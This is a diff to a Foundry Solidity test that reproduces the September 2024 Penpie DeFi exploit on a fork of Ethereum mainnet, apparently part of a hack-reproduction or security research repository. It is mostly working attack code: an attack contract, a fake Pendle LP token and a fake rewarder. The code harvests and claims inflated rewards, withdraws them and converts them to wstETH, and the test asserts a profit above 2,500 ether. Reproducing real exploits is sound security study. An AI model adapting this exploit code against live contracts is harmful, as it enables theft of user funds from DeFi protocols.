@@ -2,6 +2,8 @@
 pragma solidity 0.8.25;
 
 // Foundry
+import {VmSafe} from "@forge-std/Vm.sol";
+import {console} from "@forge-std/Console.sol";
 
 // OpenZeppelin
 import {IERC20} from "@openzeppelin-contracts/token/ERC20/IERC20.sol";
@@ -16,6 +18,7 @@ import {IPendleGaugeControllerMainchainUpg} from "src/interfaces/IPendleGaugeCon
 // Local Libraries
 
 // Base for tests
+import {Mainnet} from "src/utils/Addresses.sol";
 import {Contracts} from "src/utils/Contracts.sol";
 import {Base_Test_} from "src/Base.sol";
 
@@ -71,6 +74,13 @@ import {Base_Test_} from "src/Base.sol";
  *
  * 4. Attacker transfer back flashloaned tokens to Balancer.
  *
+ *
+ * Note:
+ * Some shortcuts have been taken to simplify the attack.
+ * - Instead of flashloan, we use a deal function to simulate it.
+ * - We don't create a real market on Pendle, and approve it on Penpie. Instead we directly register the pool on Pendle impersonnating the Market Register contract.
+ * - We use a fake rewarder contract to simulate it.
+ * - The ttack invole 4 different tokens, but we only use one in this test.
  */
 contract Hack_Penpie is Base_Test_ {
     //////////////////////////////////////////////////////
@@ -88,7 +98,7 @@ contract Hack_Penpie is Base_Test_ {
     Attack_Contract public attackContract;
     IPendleMarketDepositHelper public pendleMarketDepositHelper;
 
-    address public fakeRewarder = 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B;
+    address public rewarder;
 
     //////////////////////////////////////////////////////
     /// --- SETUP
@@ -96,12 +106,12 @@ contract Hack_Penpie is Base_Test_ {
     function setUp() public override {
         super.setUp();
 
-        // Create a fork of the mainnet
+        // Create a fork of the mainnet one block before the attack
         vm.createSelectFork(vm.envString("PROVIDER_URL_MAINNET"), ATTACK_BLOCK_NUMBER - 1);
 
         // Fetch contracts
-        pendleStaking = IPendleStaking(payable(0x6E799758CEE75DAe3d84e09D40dc416eCf713652));
-        pendleMarketDepositHelper = IPendleMarketDepositHelper(0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4);
+        pendleStaking = IPendleStaking(payable(Mainnet.PENPIE_PENDLE_STAKING));
+        pendleMarketDepositHelper = IPendleMarketDepositHelper(Mainnet.PENPIE_PENDLE_MARKET_DEPOSITOR_HELPER);
 
         // Deploy the attack contract
         fakeLPTPendle = new Fake_LPT_Pendle();
@@ -109,62 +119,112 @@ contract Hack_Penpie is Base_Test_ {
         fakeLPTPendle.setAttackContract(attackContract);
 
         // This is a cheat, to avoid creating a real market on Pendle, and approving it on Penpie.
-        vm.prank(0xd20c245e1224fC2E8652a283a8f5cAE1D83b353a);
+        // This operation create a rewarder contract on Pendle, and we need to know its address.
+        // We read logs for it.
+        vm.recordLogs();
+        vm.prank(Mainnet.PENDLE_MARKET_REGISTER_HELPER);
         pendleStaking.registerPool(address(fakeLPTPendle), 0, "Fake LPT Pendle", "fLPT");
+        VmSafe.Log[] memory entries = vm.getRecordedLogs();
+        for (uint256 i = 0; i < entries.length; i++) {
+            if (
+                keccak256(abi.encodePacked(bytes4(entries[i].topics[0])))
+                    == keccak256(abi.encodeWithSignature("PoolAdded(address,address,address)"))
+            ) {
+                (, rewarder,) = abi.decode(entries[i].data, (address, address, address));
+            }
+            if (rewarder != address(0)) {
+                break;
+            }
+        }
+        require(rewarder != address(0), "Rewarder not found");
 
         // This is a cheat, to avoid creating a real market on Pendle, helping when calling the Gauge Controller.
-        vm.mockCall(
-            0x27b1dAcd74688aF24a64BD3C9C1B143118740784,
-            abi.encodeWithSignature("isValidMarket(address)"),
-            abi.encode(true)
-        );
+        vm.mockCall(Mainnet.PENDLE_MARKET_FACTORY, abi.encodeWithSignature("isValidMarket(address)"), abi.encode(true));
 
-        // Deploy fake rewarder
+        // Deploy fake rewarder at the same address of the real one.
+        // In normal operation we will have deployed it before the attack.
+        // But we are taking shortcuts here.
         Fake_Rewarder _fakeRewarder = new Fake_Rewarder();
-        vm.etch(fakeRewarder, address(_fakeRewarder).code);
+        vm.etch(rewarder, address(_fakeRewarder).code);
         _fakeRewarder.setAttackContract(attackContract);
 
         // Labels
         vm.label(address(attackContract), "Attack_Contract");
         vm.label(address(fakeLPTPendle), "Fake_LPT_Pendle");
-        vm.label(address(fakeRewarder), "Fake_Rewarder");
+        vm.label(address(rewarder), "Rewarder");
         vm.label(0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2, "PT for stETH");
-        vm.label(0xd1D7D99764f8a52Aff007b7831cc02748b2013b5, "PT for sUSDe");
-        vm.label(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, "PT for agETH");
-        vm.label(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, "PT for rswETH");
+        //vm.label(0xd1D7D99764f8a52Aff007b7831cc02748b2013b5, "PT for sUSDe");
+        //vm.label(0x6010676Bc2534652aD1Ef5Fa8073DcF9AD7EBFBe, "PT for agETH");
+        //vm.label(0x038C1b03daB3B891AfbCa4371ec807eDAa3e6eB6, "PT for rswETH");
     }
 
     function test_Penpie_Attack_2024_09_03() public {
+        assertEq(WSTETH.balanceOf(address(attackContract)), 0, "Balance of attack contract should be 0 at beginning");
+
         deal(address(WSTETH), address(attackContract), 16_000 ether); // Simulate Balancer Flashloan
+
+        vm.startPrank(ATTACKER);
         attackContract.attack();
-        WSTETH.transfer(address(0), 16_000 ether); // Transfer back flashloaned tokens to Balancer
+        vm.stopPrank();
+
+        WSTETH.transferFrom(address(attackContract), address(0x1), 16_000 ether); // Transfer back flashloaned tokens to Balancer
+
+        assertGt(
+            WSTETH.balanceOf(address(attackContract)),
+            2_500 ether,
+            "Balance of attack contract should be greater than 2500 ether at end"
+        );
     }
 }
 
 contract Attack_Contract is Contracts {
-    IPendleStaking public pendleStaking = IPendleStaking(payable(0x6E799758CEE75DAe3d84e09D40dc416eCf713652));
+    IPendleStaking public pendleStaking = IPendleStaking(payable(Mainnet.PENPIE_PENDLE_STAKING));
     IPendleMarketDepositHelper public pendleMarketDepositHelper =
-        IPendleMarketDepositHelper(0x1C1Fb35334290b5ff1bF7B4c09130885b10Fc0f4);
-    IMasterPenpie public masterPenpie = IMasterPenpie(0x16296859C15289731521F199F0a5f762dF6347d0);
+        IPendleMarketDepositHelper(Mainnet.PENPIE_PENDLE_MARKET_DEPOSITOR_HELPER);
+    IMasterPenpie public masterPenpie = IMasterPenpie(Mainnet.PENPIE_MASTER);
     Fake_LPT_Pendle public fakeLPTPendle;
-
-    address public fakeRewarder = 0xF89140E3CEAe2d8c5dA63fd120fD0be845edEB1B;
 
     constructor(Fake_LPT_Pendle _fakeLPTPendle) {
         fakeLPTPendle = _fakeLPTPendle;
+        WSTETH.approve(msg.sender, type(uint256).max);
     }
 
     function attack() public {
         address[] memory market = new address[](1);
         market[0] = address(fakeLPTPendle);
 
+        address[] memory rewardTokens = getRewardTokens();
+
         // 1. Harvest Market Rewards
         pendleStaking.batchHarvestMarketRewards(market, 0);
 
+        uint256 balanceBefore = IERC20(rewardTokens[0]).balanceOf(address(this));
         // 2. Multiclaim
         masterPenpie.multiclaim(market);
 
+        uint256 balanceAfter = IERC20(rewardTokens[0]).balanceOf(address(this));
         // 3. Withdraw Market
+        pendleMarketDepositHelper.withdrawMarket(rewardTokens[0], balanceAfter - balanceBefore);
+        IERC20(rewardTokens[0]).approve(address(PENDLE_ROUTER), IERC20(rewardTokens[0]).balanceOf(address(this)));
+        PENDLE_ROUTER.removeLiquiditySingleToken(
+            address(this),
+            rewardTokens[0],
+            IERC20(rewardTokens[0]).balanceOf(address(this)),
+            ActionAddRemoveLiqV3.TokenOutput(
+                address(WSTETH),
+                0,
+                address(WSTETH),
+                address(0),
+                ActionAddRemoveLiqV3.SwapData(getSwapType(0), address(0), "", false)
+            ),
+            ActionAddRemoveLiqV3.LimitOrderData(
+                address(0),
+                0,
+                new ActionAddRemoveLiqV3.FillOrderParams[](0),
+                new ActionAddRemoveLiqV3.FillOrderParams[](0),
+                ""
+            )
+        );
     }
 
     function getRewardTokens() public pure returns (address[] memory) {
@@ -217,7 +277,7 @@ contract Fake_LPT_Pendle is Contracts {
     Attack_Contract public attackContract;
 
     IPendleGaugeControllerMainchainUpg public pendleGaugeControllerMainchainUpg =
-        IPendleGaugeControllerMainchainUpg(0x47D74516B33eD5D70ddE7119A40839f6Fcc24e57);
+        IPendleGaugeControllerMainchainUpg(Mainnet.PENDLE_GAUGE_CONTROLLER_MAINCHAIN_UPG);
 
     function setAttackContract(Attack_Contract _attackContract) public {
         attackContract = _attackContract;
@@ -262,7 +322,7 @@ contract Fake_Rewarder is Contracts {
         return true;
     }
 
-    function getReward(address _account, address _receiver) external returns (bool) {
+    function getReward(address, address _receiver) external returns (bool) {
         address rewardToken = 0xC374f7eC85F8C7DE3207a10bB1978bA104bdA3B2;
         IERC20(rewardToken).transfer(_receiver, IERC20(rewardToken).balanceOf(address(this)));
         return true;
